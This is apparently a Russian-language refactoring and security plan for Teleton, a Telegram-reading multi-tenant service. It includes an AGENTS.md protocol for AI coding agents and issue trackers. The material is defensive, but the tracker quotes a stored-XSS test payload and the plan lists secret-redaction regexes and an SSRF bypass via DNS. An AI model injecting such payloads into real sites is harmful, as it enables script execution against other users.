**Красный тест:** запрос с текстом длиннее лимита обрезается, а не отправляется целиком;
при превышении месячного лимита `process_messages_batch_with_llm` возвращает `None`
и пишет лог, не обращаясь к API.

---

### Задача 4.6 — Секреты не попадают в журнал

`add_log` (`server.py:317`) пишет сырые тексты исключений. HTTP-исключения `httpx` содержат
заголовки, а в заголовках — `Authorization: Bearer sk-or-...`.

Реализация: функция `redact(text)` со списком паттернов (`sk-or-[\w-]+`, `\d{8,10}:[\w-]{35}`,
`Bearer \S+`), применяется ко всем `details` перед записью.

**Красный тест:** `add_log(details="Bearer sk-or-v1-secret")` сохраняет строку без `sk-or-v1-secret`.

---

### Задача 4.7 — Прочие исправления корректности

| Что                                                                                                                                                     | Где             | Как                                                                     |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------ | -------------------------------------------------------------------------- |
| `get_setting` считает `""` за «не задано» и уходит в fallback — нельзя очистить webhook_url                  | `server.py:267`  | различать`None` и `""`                                       |
| `update_integrations_config` строит `SET {k} = ?` из ключей словаря — сток для инъекции имени колонки | `server.py:251`  | белый список колонок или ORM                          |
| `/health` отдаёт анониму `id`, `first_name`, `username` аккаунта                                                              | `server.py:1075` | отдавать только`{"status": "ok"}`                          |
| `iter_messages` + `break` по времени обрывается на закреплённом сообщении                                    | `server.py:706`  | `continue` вместо `break`, ограничение по `limit` |

---

## 8. ФАЗА 5 — Фронтенд

---

### Задача 5.1 — Разобрать `index.html`

3975 строк в одном файле. Разложить: разметка в `index.html`, стили в `static/css/`,
логика в `static/js/` по вкладкам (`feed`, `channels`, `messages`, `integration`, `logs`)
плюс общие `api.js`, `render.js`, `auth.js`.

Сборку **не заводим** — остаёмся на ES-модулях (`<script type="module">`). Ванильный SPA
работает и быстрый; менять его на сборку — отдельное решение, за рамками этой задачи.

---

### Задача 5.2 — Экранирование по умолчанию

В `render.js` — единственная функция построения HTML, которая экранирует все подстановки.
Прямой `innerHTML` со строковой интерполяцией запрещается тестом из задачи 0.4, который теперь
проверяет и новые файлы. Это то, что не даёт XSS вернуться.

---

### Задача 5.3 — Экраны входа

`login.html`, `signup.html`, `password-reset.html`. Отдельные страницы, не часть SPA:
на них не должно грузиться ничего лишнего.

---

### Задача 5.4 — Аватарки из строк ленты

`photo_base64` лежит в каждой строке `analysis_feed` и целиком уезжает клиенту при
`GET /api/feed?limit=200` (`server.py:452`). Двести base64-аватарок — это мегабайты на запрос.

Вынести в таблицу `chat_avatars` (`chat_id`, `image_bytes`, `fetched_at`), отдавать через
`GET /api/avatars/{chat_id}` с `Cache-Control`. Из ответа `/api/feed` убрать и `photo_base64`,
и `raw_messages_json` (последний нужен только в детальном виде — `GET /api/feed/{id}`).

**Красный тест:** ответ `GET /api/feed?limit=50` весит меньше 200 КБ и не содержит `data:image`.

---

## 9. ФАЗА 6 — Вход через Google (Firebase)

**Ключевое решение: Firebase — провайдер идентичности, а не система сессий.**
`firebase-admin` проверяет ID-токен → находим или создаём пользователя в своей таблице →
выдаём **свою** cookie-сессию. Так остаётся контроль над отзывом доступа, работает админка,
и потом можно добавить GitHub или Apple, не переписывая аутентификацию.

- `POST /auth/google` принимает `id_token`, верифицирует через `firebase_admin.auth.verify_id_token`.
- Связывание: если email из Google совпадает с существующим пользователем — привязать провайдера
  (`identities`: `user_id`, `provider`, `provider_uid`), а не создавать дубль.
- `users.password_hash` становится nullable — пользователь может не иметь пароля вовсе.

**Красный тест** — `tests/test_60_google.py` с подменённой верификацией:
невалидный токен → 401; валидный токен нового пользователя → создание + сессия;
валидный токен с email существующего пользователя → привязка, а не второй аккаунт;
подделанный токен с чужим `aud` → 401.

---

## 10. ФАЗА 7 — Деплой и CI

---

### Задача 7.1 — Два сервиса Railway

Один Docker-образ, две команды:

```
web:    uvicorn app.main:app --host 0.0.0.0 --port $PORT
worker: python -m app.worker
```

Общий managed Postgres по приватной сети. Все секреты — переменные окружения Railway.
`railway.json` обновить: healthcheck на `/health`.

**Проверка:** редеплой не требует переавторизации в Telegram (сессия в БД, задача 3.2).

---

### Задача 7.2 — Заголовки безопасности

Middleware: `Content-Security-Policy` (запретить inline-скрипты — после задачи 5.1 это
возможно), `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`,
`Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options: DENY`.

**Красный тест:** каждый заголовок присутствует в ответе.

---

### Задача 7.3 — CI

По образцу `Ruby/.github/workflows/ci.yml` — четыре джоба:

| Джоб      | Команда                             | Аналог в Rails-шаблоне |
| ------------- | ------------------------------------------ | ------------------------------------ |
| `security`  | `bandit -r app/ -ll && pip-audit`        | `brakeman`                         |
| `lint`      | `ruff check . && ruff format --check .`  | `rubocop`                          |
| `typecheck` | `mypy app/`                              | `npm run check`                    |
| `test`      | `pytest -q` с сервисом Postgres | `bin/rails test`                   |

Плюс собственный джоб `secret-scan`: `gitleaks` или `trufflehog` по всему дереву.
Область сканирования — **всё дерево**, не список расширений. Узкая проверка создаёт ложное
спокойствие: зелёная метрика при живом ключе в дереве хуже, чем отсутствие метрики.

---

### Задача 7.4 — Документация

Переписать `README.md` и `PROJECT_OVERVIEW.md` под новую архитектуру. Удалить `server.py`
после переноса всего кода в `app/`. Финальная запись в `PROGRESS.md`.

---

## 11. Содержимое файла `AGENTS.md`

Создать `AGENTS.md` ровно с этим текстом (задача 0.6):

````markdown
# Правила работы над Teleton

Над этим репозиторием работают несколько ИИ-агентов и человек. Агенты друг друга не видят:
у каждого своя сессия и свой контекст. Всё, что не записано в репозиторий, для остальных
не существует.

Этот файл — протокол, который делает параллельную работу возможной. Прочитайте его целиком
в начале сессии, до первого изменения файлов.

---

## 0. Что это за проект и чем он опасен

Teleton читает Telegram-каналы **от лица живого пользовательского аккаунта** через MTProto
(Telethon), анализирует посты через LLM и рассылает их в n8n и Telegram-ботов. Приложение
мульти-тенантное: каждый пользователь подключает свой аккаунт.

Отсюда следует главное. **На сервере лежат MTProto-сессии чужих аккаунтов.** Такая сессия —
не пароль: её нельзя сбросить удалённо, и она даёт полное чтение переписки владельца. Утечка
базы — это не «утечка данных сервиса», это компрометация всех подключённых аккаунтов разом.

Практический вывод: в этом репозитории правило «сначала работает, потом безопасно» не действует.
Задача, закрывающая функциональность, но открывающая доступ, считается не сделанной.

---

## 1. Перед началом работы

```bash
git fetch --all --prune
git log --oneline -15
gh pr list --state open
git worktree list
```

Затем прочитайте `PROGRESS.md` — журнал проходов. Раздел «Что не сработало» особенно важен:
там записано, какие подходы уже пробовали и почему они не подошли. Повторять их заново —
потерянный проход.

---

## 2. Своя ветка

Имя ветки — `phase<N>/task<N.M>-<короткое-имя>`, номер совпадает с номером задачи в плане.
По списку веток и открытых PR видно, какие задачи заняты.

Прямой push в `main` запрещён.

Если работаете параллельно с другим агентом — заведите отдельный worktree. Общий `.venv`
на два каталога приводит к тому, что установленная одним агентом зависимость ломает прогон
у второго, а выглядит это как «тест падает по непонятной причине».

---

## 3. Порядок работы: CDD

Строго в этом порядке:

1. **Красный тест** — `tests/test_NN_<имя>.py` по разделу «Красный тест» из плана задачи.
   Запустить. Он **обязан упасть**, и упасть на `assert`, а не на `ImportError`.
2. **Реализация** до зелёного.
3. **Проверка**: `pytest -q && ruff check . && mypy app/`.
4. **Коммит**: одна задача — один коммит, сообщение начинается с номера задачи.

Тест, написанный после реализации, проверяет то, что вы сделали, а не то, что требовалось.
В проекте, где половина задач про безопасность, это разница между «код работает» и
«код делает ровно то, что заявлено».

**Тест не удаляется и не ослабляется, чтобы стал зелёным.** Если тест мешает — либо в нём
ошибка (исправьте тест и объясните в PR почему), либо ошибка в реализации. Третьего варианта нет.

---

## 4. Задача закрывается не автором

Не помечайте задачу выполненной на основании статического уровня теста. Поведенческий уровень
требует живого Postgres и настоящего Telegram-аккаунта; вердикт выносит прогон в среде, где
они есть. В PR пишите отдельно, что подтверждено, а что осталось неподтверждённым — это и есть
содержательная часть ревью.

Поведенческий тест при отсутствии среды обязан честно писать `pytest.skip` с внятной причиной.
Тест, который в отсутствие базы возвращает зелёный, хуже отсутствующего теста.

---

## 5. База данных

**Схема меняется только миграцией Alembic.** Никакого DDL руками через панель Railway или `psql`.
Нарушение этого правила невидимо: код в репозитории не меняется, PR показывать нечего, а
следующий `alembic upgrade head` в другой среде вернёт схему к состоянию из репозитория.

Миграции только вперёд. Уже применённый файл не редактируется — заводится следующий.

**`ALTER TABLE` в коде приложения запрещён.** До рефакторинга схема мигрировалась шестью блоками
`try: cur.execute("ALTER TABLE ...") except Exception: pass` — ошибки проглатывались, и узнать,
что колонка не добавилась, было невозможно. Правило держит тест `test_13_migrations.py`.

**`user_id` обязателен во всех тенантных таблицах**, `NOT NULL`, с индексом. Правило держит
`test_12_models.py`. Запрос без фильтра по `user_id` — это утечка данных между клиентами, а не
стилистическая придирка.

**Не пишите `WHERE user_id = ...` руками.** Ходите через `TenantRepo` — слой, в котором забыть
фильтр невозможно. Один забытый `where` в одном обработчике из сорока — и пользователь A читает
ленту пользователя B.

---

## 6. Telethon и Telegram

**Долгоживущими клиентами владеет только воркер.** Веб-процесс поднимает клиент лишь на время
авторизации пользователя и отключает сразу после. Два процесса на одном auth-key приводят к
`AUTH_KEY_DUPLICATED`, и Telegram может убить сессию пользователя — то есть ваша ошибка
выбрасывает клиента из его собственного аккаунта.

**Сессии хранятся как `StringSession` в БД в зашифрованном виде.** Файлы `.session` не создаются
никогда: на Railway файловая система эфемерна, файл исчезает при редеплое, и пользователь
получает требование заново вводить SMS-код.

**`FloodWaitError` — не ошибка, а сигнал.** Не ретраить сразу. При `seconds > 300` пропустить
цикл и записать `retry_after`. Telethon умеет ждать сам, но ожидание на несколько часов вешает
воркер целиком.

**Не превышайте лимит запросов кода авторизации.** Три попытки в час на пользователя — это
не защита сервера, а защита аккаунта клиента от вашего же сервиса: Telegram ограничивает
аккаунты, которым слишком часто шлют коды.

---

## 7. Учётные данные

Пароли и ключи не вставляются в чат, в тикеты, в PR и в файлы репозитория — даже временно,
даже «чтобы агент подключился». Всё, что попало в переписку, считается скомпрометированным
и требует перевыпуска; удаление сообщения или файла ничего не отменяет.

**Так уже случилось.** `.dockerignore` содержал `.venv/` и `__pycache__`, но не содержал `.env`,
`*.session` и `storage.db`, а `Dockerfile` делал `COPY . .`. В каждый собранный образ попадали
`TELEGRAM_API_HASH`, живой auth-key Telegram-аккаунта и база с ключом OpenRouter. Файлы при этом
были в `.gitignore` — то есть выглядело всё правильно, и в git они действительно не попали.
`.gitignore` и `.dockerignore` — разные файлы с разными списками; совпадение одного не говорит
ничего о втором.

`.env` в репозиторий не попадает. `APP_ENCRYPTION_KEY` не хранится нигде, кроме переменных
окружения Railway. Секрет-скан в CI — обязательный гейт, и сканирует он **всё дерево**, а не
список расширений: узкая проверка даёт зелёный статус при живом ключе в репозитории, и это
хуже, чем отсутствие проверки.

---

## 8. Запись прохода

После задачи допишите в `PROGRESS.md`:

```markdown
### <дата> — задача N.M «<название>»

**Сделано:** ...
**Подтверждено:** какие тесты зелёные и в какой среде.
**Не подтверждено:** что требует прогона с живым Postgres / Telegram.
**Что не сработало:** отвергнутые подходы и почему. ← самое ценное для следующего агента
**Дальше:** ...
```

Раздел «Что не сработало» экономит чужой проход. «Всё получилось» не сообщает ничего.

`PROGRESS.md` правится **одним коммитом в конце PR**, а не по ходу работы — иначе конфликты
при параллельной работе.

---

## 9. Документация: где живёт статус

| Что | Где |
|---|---|
| Прогресс по задачам | `PROGRESS.md` |
| Архитектура и API | `PROJECT_OVERVIEW.md` |
| Установка и запуск | `README.md` |
| Правила работы | `AGENTS.md` (этот файл) |

Больше нигде. Остальные документы на статус **ссылаются**, а не повторяют его. Скопированный
статус устаревает молча: через месяц два документа рассказывают разное, и определить по тексту,
какой из них новее, нельзя.

**Точки входа правятся добавлением, а не заменой.** `AGENTS.md`, `README.md` и
`PROJECT_OVERVIEW.md` целиком не переписываются: устаревший раздел правится или помечается
устаревшим, но не удаляется заодно с соседними. Пропажу такого рода не видно в диффе — там
она выглядит как сокращение.

---

## 10. Что такое зелёный

На PR проверяются: `pytest -q`, `ruff check`, `mypy app/`, `bandit -r app/ -ll`, `pip-audit`,
секрет-скан по всему дереву.

**Тест, который не запускается локально, — не «проблема среды», пока это не доказано.**
Одно объяснение на два разных падения — это гипотеза, а не вывод. Симптом закрывается
установкой зависимости и прогоном, а не рассуждением.

---

## 11. Ограничения, которые уже стоили времени

- **`.gitignore` ≠ `.dockerignore`.** См. §7. Секреты были корректно исключены из git и при этом
  попадали в каждый Docker-образ.
- **`SELECT` + `INSERT` не заменяют `ON CONFLICT`.** Дедупликация через отдельные запросы имеет
  окно между ними: ручной запуск и тик планировщика по одному каналу отправляли один пост дважды.
  Только `INSERT ... ON CONFLICT DO NOTHING RETURNING`.
- **Проверка SSRF по имени хоста бесполезна.** Домен может резолвиться в `127.0.0.1`
  (`localtest.me` — публичный пример). Резолвьте DNS и проверяйте полученный IP. И запрещайте
  редиректы: иначе разрешённый URL отправляет на запрещённый.
- **Пустая строка ≠ «не задано».** `get_setting` считал `""` за отсутствие значения и уходил
  в fallback, из-за чего было невозможно очистить `webhook_url` или отключить ключ.
- **403 вместо 404 на чужом объекте — утечка.** 403 подтверждает, что объект существует.
  На чужие ресурсы всегда 404.
- **`iter_messages` идёт от новых к старым.** `break` по временному окну обрывает выборку на
  первом закреплённом сообщении, которое может прийти вне хронологии. Нужен `continue`.
- **Ключ шифрования нельзя ротировать «на живую».** Смена `APP_ENCRYPTION_KEY` без
  перешифровки делает нечитаемыми все Telegram-сессии пользователей — то есть выбрасывает всех
  из аккаунтов. Ротация — отдельная процедура с перешифровкой, а не смена переменной.
- **Firebase — провайдер идентичности, а не система сессий.** ID-токен проверяется один раз
  при входе, дальше работает своя cookie-сессия. Иначе теряется возможность отозвать доступ.
````

---

## 12. Полный список найденных проблем — трекер

Отмечайте по мере закрытия. Номера ссылаются на задачи выше.

### Критические

- [x] **К1** `.dockerignore` пропускает `.env`, `*.session`, `storage.db`, `key.md` → задача 0.1 *(закрыто 2026-09-01, тест зелёный; проверка docker build ожидает запущенного демона)*
- [x] **К2** Нет аутентификации ни на одном из ~40 эндпоинтов → задача 2.3 *(закрыто окончательно 2026-09-05: сборка `app/main.py` закрыта по умолчанию и протестирована перебором всех маршрутов; перенос эндпоинтов завершён 2026-09-04, а 2026-09-05 задачей 7.4 удалён сам `server.py` — `uvicorn server:app` больше физически невозможен. Трипваер `test_75_monolith_retired.py` держит отсутствие файла навсегда)*
- [x] **К3** `GET /api/openrouter`, `GET /api/telegram-forward` отдают сырые ключи → задача 0.3 *(закрыто 2026-09-01, статический тест зелёный; заодно закрыта утечка `api_hash` в `GET /api/settings`)*
- [x] **К4** Секреты в БД открытым текстом → задача 3.4 *(закрыто 2026-09-02: MTProto-сессия — задача 3.2; секреты интеграций + отказ старта без/с коротким ключом — 3.4. Старые таблицы в storage.db шифруются при переносе — задача 1.5)*
- [x] **К5** SSRF: `webhook_url` без валидации, `POST /api/webhook/send-payload` → задача 4.4 *(закрыто 2026-09-02: валидация по резолвнутому IP до запроса, редиректы не следуются; прокси-эндпоинт не переносится — трипваер держит его отсутствие; в server.py-монолите эндпоинт жив до отставки — К2)*

### Высокие

- [x] **В6** Stored XSS через `chat_title` / `d.name` / `log.*` → задача 0.4 *(закрыто 2026-09-01, статический тест зелёный с self-test'ами на сканер; 2026-09-01 подтверждено оператором в живом браузере — `<img src=x onerror=alert(1)>` не исполняется)*
- [x] **В7** `POST /api/settings` перезаписывает `.env` целиком → задача 1.2 *(закрыто 2026-09-01: эндпоинт и `update_env_file` удалены, ключи — только из ENV; зелёный прогон test_11 ожидает установки пакетов)*
- [x] **В8** Файл сессии на эфемерной ФС Railway → задача 3.2 *(закрыто 2026-09-02: сессия — StringSession в БД зашифрованной Fernet, файловой сессии больше нет)*
- [x] **В9** Нет rate limiting, включая запрос кода Telegram → задача 2.7 *(закрыто 2026-09-02: login/signup/password-reset — задача 2.7; send-code 3/час повешен при переносе эндпоинта — задача 3.3. Старые эндпоинты в server.py — см. К2)*
- [x] **В10** `auth_state` — глобальная переменная процесса → задача 3.3 *(закрыто в новой сборке `app/`; монолит `server.py`, где дефект оставался, удалён задачей 7.4 — 2026-09-05)*
- [x] **В11** Нет CSRF-защиты → задача 2.6 *(закрыто полностью 2026-09-04: сборка app/main защищена double-submit middleware на все не-GET маршруты; фронтенд шлёт `X-CSRF-Token` — все шесть модулей SPA ходят через `static/js/api.js`, единственный прямой fetch в `auth-pages.js` тоже с токеном. Примечание «index.html не шлёт заголовок» устарело после разбора монолитного фронтенда задачей 5.1)*

### Средние

- [x] **С12** Гонка в дедупликации → задача 4.2 *(закрыто 2026-09-02: дедуп — один INSERT ... ON CONFLICT DO NOTHING RETURNING, окно SELECT→INSERT устранено; тест гонки на двух независимых сессиях)*
- [x] **С13** SQLite без WAL, соединение на каждый вызов → Фаза 1 *(закрыто в новой сборке `app/`; монолит `server.py`, где дефект оставался, удалён задачей 7.4 — 2026-09-05)*
- [x] **С14** Одно-процессность из-за синглтона Telethon → задача 4.1 *(закрыто 2026-09-02 в новой сборке app/: воркер — отдельный процесс-владелец пула, web не тянет tg_pool; server.py-монолит остаётся одно-процессным до его отставки — см. К2)*
- [x] **С15** Миграции через `try/except ALTER TABLE` → задача 1.4 *(закрыто в новой сборке `app/`; монолит `server.py`, где дефект оставался, удалён задачей 7.4 — 2026-09-05)*
- [x] **С16** `get_setting`: пустая строка = «не задано» → задача 4.7 *(закрыто 2026-09-02: контракт save_integration_secrets — None «не передано» не затирает, "" «очистить» обнуляет; параметризовано на всех трёх секретах)*
- [x] **С17** `update_integrations_config` строит `SET {k}` из ключей словаря → задача 4.7 *(закрыто в новой сборке `app/`; монолит `server.py`, где дефект оставался, удалён задачей 7.4 — 2026-09-05)*
- [x] **С18** Нет лимитов расходов на LLM → задача 4.5 *(закрыто 2026-09-02: потолок 48к символов на запрос, месячный счётчик llm_usage, гейт + автоотключение openrouter_enabled с записью в журнал)*
- [x] **С19** `photo_base64` и `raw_messages_json` в списочном ответе ленты → закрыто задачей 5.4
- [x] **С20** Секреты в текстах исключений в журнале → задача 4.6 *(закрыто 2026-09-02: redact в journal.add_log — единственной точке записи LogEntry; llm.py пишет через add_log; структурный свип держит отсутствие прямого конструктора навсегда)*
- [x] **С21** Дубль `Ruby/`, пустой `storage.db` в корне → задача 0.5 *(закрыто 2026-09-01; уникальный `STACK-COMPARISON.md` спасён в `Teleton/Ruby/`)*
- [x] **С22** `/health` раскрывает данные аккаунта анониму → задача 4.7 *(закрыто 2026-09-02: новая сборка отвечает только {"status": "ok"} (2.3), трипваер-тест держит строгое равенство навсегда)*
- [x] **С23** `iter_messages` + `break` обрывается на закреплённом посте → задача 4.7 *(закрыто 2026-09-02: fetch_channel_messages — continue вместо break, объём ограничен limit)*

- [x] **С25** Свип 0.3 перестал видеть эндпоинты после разбора на роутеры → задача 9.14 *(закрыто 2026-09-09: проверка искала `@app.<метод>` и после Фазы 5 покрывала 4 маршрута из 46, оставаясь зелёной; добавлены счётчик-антивакуум и сканирование помощников `app/api/`)*
- [x] **С24** Пустое поле секрета в форме отправлялось как «очистить» → задача 9.13 *(закрыто 2026-09-08: секрет уходит только через `withSecret`, очистка — отдельная кнопка; статический свип запрещает секретное поле в теле запроса, поведение помощника проверяется на node)*

---

## 13. Открытые вопросы — решить до Фазы 1

1. ~~**Чей `API_ID`/`API_HASH`?**~~ **Решено владельцем 2026-09-07: свой у каждого
   пользователя.** Он регистрирует приложение на my.telegram.org и вносит ключи в кабинет;
   подключение его аккаунта идёт только через них. Общего ключа сервиса нет и отката на него
   в приложении нет — ограничение Telegram на одно приложение выключило бы вход сразу у всех,
   а молчаливая подстановка выглядела бы как «работает» ровно до этого дня. Реализация —
   задача 9.5, ревизия `0008_telegram_credentials`.
2. **Postgres или SQLite с томом Railway?** План написан под Postgres — SQLite держит одну запись
   за раз и не переживает мульти-тенант с параллельной записью веба и воркера. Если сервис
   останется на десяток пользователей, том дешевле; тогда Фаза 1 упрощается, но задача 4.1
   (два процесса) становится невозможной.
3. **Что показывать пользователю при подключении Telegram?** Нужен явный дисклеймер: сервис
   получает доступ к чтению переписки, а массовая автоматизация пользовательских аккаунтов —
   серая зона в ToS Telegram, и аккаунт может быть ограничен.
4. **Сроки хранения.** Автоочистка уже есть (7/14/30/60/90 дней), но для публичного сервиса
   нужен ещё и полный экспорт и удаление аккаунта по запросу пользователя

---

## 14. ФАЗЫ 8–10 — доведение до рабочего запуска

Источник формулировок — `Teleton/PLAN_REFINEMENT.md` (2026-09-05). Он лежит в корне
`Teleton/`, а корень **не был под git**: до 2026-09-10 репозиторий начинался
с подкаталога `FastAPI/`. То есть
повторилась ровно та ситуация, из-за которой в сентябре переехал корневой `PLAN.md` —
план поддерживался там, где его не видит склонировавший репозиторий агент. Свод
перенесён сюда; корневой файл остаётся исходником обсуждения с владельцем.

Ниже — **замысел задач** фаз 8–10: что делать и почему. Разбор, из которого он
вырос, — аудит 2026-09-07 (ветка `phase0/security-hardening`, вершина `ddc464a`:
380 passed, 6 skipped локально).

**Состояние каждой задачи — только в трекере раздела 15.** Проза его не
повторяет: дубль статуса не бывает долговечным — обновляют трекер, а проза
остаётся и начинает врать. Именно это случилось к 2026-09-14 и чинится
задачей 13.4; свип `test_132` не даёт повториться.

### Фаза 8 — раздельный деплой должен наконец подняться

**8.1. Причина Vercel 500 — ✅ установлена.** Публикация `bGvtHw6A…` собрана из `main`,
коммит `87649c2` — это **монолит**: `server.py:28` делает `EXPORTS_DIR.mkdir()` на
read-only `/var/task`, отсюда 500 на корне. Исправление не применено: на 2026-09-07
`GET /` Vercel по-прежнему отдаёт 500.

**Главный факт аудита, из которого следует вся Фаза 8.** Вся работа фаз 1–9 живёт в
ветке `phase0/security-hardening`; `origin/main` отстаёт на **101 коммит** и содержит
удалённый задачей 7.4 `server.py`. Деплой смотрит на `main`. Пока ветка не влита,
любые правки `vercel.json` и переменных Railway меняют конфигурацию вокруг старого кода.

**8.2. Условия первого релиза — ✅ согласованы владельцем** (преамбула
`PLAN_REFINEMENT.md`): вход через Google обязателен уже в первой приёмке, старые
данные переносятся обязательно, продуктовых квот нет, модель получает только
необработанные сообщения.

**8.3. Статика и маршрутизация Vercel.**
На момент аудита работа лежала в `worktrees/release` (25 изменённых файлов + новый `tests/test_83_release.py`
на 21 сценарий) поверх `bfb3fbf`. Сделано: `/static/:path*` → `/:path*`, реальный host
Railway вместо `REPLACE-WITH-RAILWAY-HOST`, CSP под шрифты и Firebase, нормализация
`DATABASE_URL` в `postgresql+asyncpg://`, отказ от `firebase-admin` в пользу
`google-auth` (проверка по публичным сертификатам — приватный ключ сервисного
аккаунта больше не нужен), CSRF-бутстрап на статических страницах, пагинация истории.

Не доделано — три красных теста и пять ошибок типизации, все из одного корня:

1. `app/api/checks.py` — половина рефакторинга. Вызовы уже ждут пару
   (`row, secrets = await _secrets(repo)`), а сама `_secrets()` по-прежнему возвращает
   один словарь: `ValueError: too many values to unpack`, mypy даёт 5 ошибок в этом же
   файле. Падает `test_55::test_check_without_configuration_is_400_not_500` и
   `test_83::test_check_failures_never_return_or_log_provider_secrets`.
2. `test_76::test_csp_stays_narrow_when_google_is_not_configured` против
   `test_83::test_backend_csp_allows_the_fonts_used_by_index` — прямой конфликт
   контрактов. Разрешается разделением: шрифты `fonts.googleapis.com`/`fonts.gstatic.com`
   нужны странице всегда, домены входа (`apis.google.com`, `*.firebaseapp.com`) —
   только при настроенном Firebase. Сузить проверку в `test_76` до Google-части,
   объяснив правку в коде теста (AGENTS §3).
3. `ruff format` — один файл не отформатирован.

**8.4. Railway — 🟥 не начато, вопреки виду настроенного проекта.** Проверено через API:
в проекте `Teleton` есть все три сервиса (`Postgres`, `web`, `worker`), у `web` и
`worker` правильный билдер (Dockerfile), правильные команды
(`uvicorn app.main:app …` / `python -m app.worker`), healthcheck `/health` только у
`web`, по 8 переменных у каждого. И при этом **ни одного деплоя**: `list_deployments`
пуст для обоих, а host из `vercel.json`
(`web-production-d2e997.up.railway.app`) отвечает `404 Application not found`.
Значит сервисам не подключён источник — репозиторий и ветка. Порядок: влить ветку →
подключить источник → дождаться первой сборки → получить фактический публичный адрес →
только потом сверять его с `vercel.json`.

**8.5. CSRF при первом посещении — ✅** в незакоммиченной работе (`auth-pages.js`,
`test_83::test_static_password_reset_bootstraps_before_first_post` зелёный).

**8.6. Соответствие сценарию анализа — 🟡.** Серверная часть закрыта в `ddc464a`
(в модель уходит только непрочитанное, частичный анализ не перечитывает удавшийся
кусок, месячный бюджет откладывает батч, а не теряет). Интерфейсная часть — статусы
запусков, «загрузить ещё», очередь вместо мнимого успеха — в незакоммиченной работе.
Живой проверки не было ни у одной половины.

### Фаза 9 — надёжность до публичного запуска

Три задачи о том, чтобы отказ одного места не уносил остальное: доставка
переживает падение процесса (9.1), FloodWait соблюдается между тиками и
перезапусками (9.2), отказ одного источника не обрывает другие (9.3) —
15 сценариев `test_90_worker_recovery.py`.

Требование плана «проверить на настоящем Postgres, а не только SQLite» выполнено
не кодом, а средой: джоб `test` в CI поднимает сервис `postgres:16` и задаёт
`TEST_DATABASE_URL`, поэтому поведенческие тесты идут на живой СУБД. Локально их
честно пропускают — базы на машине нет.

**9.4 Логи и границы тенантов.** Сообщения проверок обязаны быть обезличены
(`«OpenRouter не ответил»` вместо текста исключения, который несёт
`Authorization: Bearer`); контракт задачи — тест
`test_83::test_check_failures_never_return_or_log_provider_secrets`.

Вторая половина — ручные фильтры по `user_id` мимо `TenantRepo`. Аудит нашёл
четыре; утечки они не давали, но нарушали правило AGENTS §5, которое существует
затем, чтобы пятый такой фильтр не пришлось искать глазами. Правило и код сведены
задачей 12.6: граница проведена по свойству («есть `repo` в функции — фильтр
запрещён»), исключение записано в `AGENTS.md`, свип `test_124` сторожит обе
стороны.

### Фаза 10 — приёмка и эксплуатация

**10.1 Живой пользовательский сценарий — не начато.** Блокируется 8.4.

**10.2 Данные и эксплуатация.** Две половины. Первая — перенос: скрипт и
`docs/MIGRATE_LEGACY.md`; резервная копия боевых `storage.db` и
`personal_account.session` снята с контрольными суммами в `private-backups/`
(вне git — правильно; это живые секреты, обращаться как с ключами).

Вторая — наблюдаемость (10.2a): готовность БД, heartbeat воркера, возраст
`pending`-задач. `GET /health` отвечает «процесс жив» и о базе с воркером не знает
ничего — а именно молчащий воркер самый вероятный отказ этой архитектуры (пункт 6
чек-листа `DEPLOY.md`); поэтому состояние отдаёт отдельный `GET /api/ops/health`,
закрытый входом. Задача 13.3 добавила к опросу **толчок**: о простое и о
развалившемся источнике владельцу приходит сообщение в его же бота.

**10.3 Финальные проверки.** Полный набор гейтов обязан пройти на живом
Postgres, а не только локально: на момент аудита CI не видел ни одного из двух
новых коммитов — они не были запушены.

### Долги протокола, найденные аудитом

- **Р1.** `ddc464a` и `0ba96b6` не запушены → нет прогона на живом Postgres, а PR #1
  открыт с 1 сентября под заголовком «Фаза 0» и не отражает фактический объём.
- **Р2.** В `PROGRESS.md` нет записей о работах 8.2 и 9.1 (AGENTS §8). Последняя
  запись — 5 сентября.
- **Р3.** Цепочка миграций ломается **в середине истории**: ревизия `0007` приехала
  коммитом `0ba96b6`, а её `down_revision = "0006_worker_recovery"` появился только в
  следующем коммите `ddc464a`. На вершине ветки цепочка линейна и `alembic heads`
  даёт один head, но `alembic upgrade head` на промежуточном коммите падает. Лечится
  при подготовке PR (порядок коммитов), не в коде.
- **Р4.** Язык. Новые docstring'и (`app/services/google_auth.py`) переписаны на
  английский, в `docs/DEPLOY.md` длинные тире заменены дефисами. `CLAUDE.md`: проект и
  документация на русском — правило стоит соблюсти или сознательно отменить, но не
  дрейфовать.

### Порядок работ

`8.3 → merge → 8.4 → 9.4 → 8.6/10.1 → 10.2 → 10.3`. Первым идёт 8.3, потому что
незакоммиченная работа в worktree — самое хрупкое состояние в проекте: она не
защищена ни CI, ни коммитом, и теряется целиком от одной неосторожной команды.
Слияние в `main` идёт вторым и до подключения источника Railway: деплоить имеет смысл
только ту ветку, где нет монолита.

---

## 15. Трекер выпуска (Фазы 8–10)

- [x] **8.1** Причина Vercel 500 установлена
- [x] **8.2** Условия первого релиза согласованы
- [x] **8.3** Довести незакоммиченную работу до зелёного: `_secrets()` → пара, конфликт CSP, `ruff format`
- [x] **8.3-b** Влить `phase0/security-hardening` в `main` (101 коммит), обновить заголовок и описание PR #1
- [x] **8.4** Подключить источник сервисам `web` и `worker`, получить первую сборку, сверить host с `vercel.json`
- [x] **8.5** CSRF при первом посещении *(в незакоммиченной работе)*
- [x] **8.6a** Живой опрос двух каналов состоялся: 39 сообщений, 3 карточки ленты, доставка SUCCESS
- [ ] **8.6b** Тот же прогон С АНАЛИЗОМ: `model_name` = «MTProto Direct», `ai_analysis` пуст — ключ OpenRouter в новом кабинете не задан, промпты каналов пока не работают
- [x] **9.1** Доставка переживает падение процесса
- [x] **9.2** FloodWait соблюдается между тиками и перезапусками
- [x] **9.3** Отказ одного монитора не обрывает остальные *(aiosqlite; Postgres — нет)*
- [x] **9.4** Секреты не попадают в stdout/traceback; тенантные операции через `TenantRepo`
- [x] **9.5** Ключи MTProto принадлежат пользователю (открытый вопрос №1 закрыт)
- [x] **9.6** Интерфейс закрыт по умолчанию: гвардия сессии, возврат после входа, выход из кабинета
- [x] **9.7** Код подтверждения подтверждается той же MTProto-сессией, что его запросила
- [x] **9.8** Ни одного инлайнового обработчика: при `script-src 'self'` они не исполняются
- [x] **9.9** Действия аккаунта выполняются сессией аккаунта, а не сессией входа
